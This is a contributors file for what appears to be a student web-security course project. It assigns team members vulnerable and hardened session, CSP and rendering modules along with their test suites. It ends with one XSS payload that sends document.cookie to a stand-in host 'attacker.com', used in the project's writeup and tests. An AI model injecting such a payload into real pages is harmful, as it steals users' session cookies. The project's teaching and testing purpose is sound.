# Contributors

Commit only to the files listed for your name. Leave other people's TODOs alone.

| Person | Owns | Tests to turn green | Issue |
|--------|------|---------------------|-------|
| Quis Franklin | `server/session/vulnerable.js`, `server/session/hardened.js` | `tests/session.test.js` | https://github.com/jfrank58-G6/Itis-3200-Project/issues/1 |
| Sean Hicks | `server/csp/vulnerable.js`, `server/csp/hardened.js` | `tests/csp.test.js` | https://github.com/jfrank58-G6/Itis-3200-Project/issues/2 |
| Zaheir Carillo | `public/vulnerable/profile.js`, `public/hardened/profile.js` | `tests/render.test.js` | https://github.com/jfrank58-G6/Itis-3200-Project/issues/3 |
| Jordan Jacobs | `server/app.js`, `server/routes.js`, `tests/helpers/app.js`, `README.md` | harness used by the other suites | https://github.com/jfrank58-G6/Itis-3200-Project/issues/4 |

XSS payload used in the writeup and render tests:

```
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```
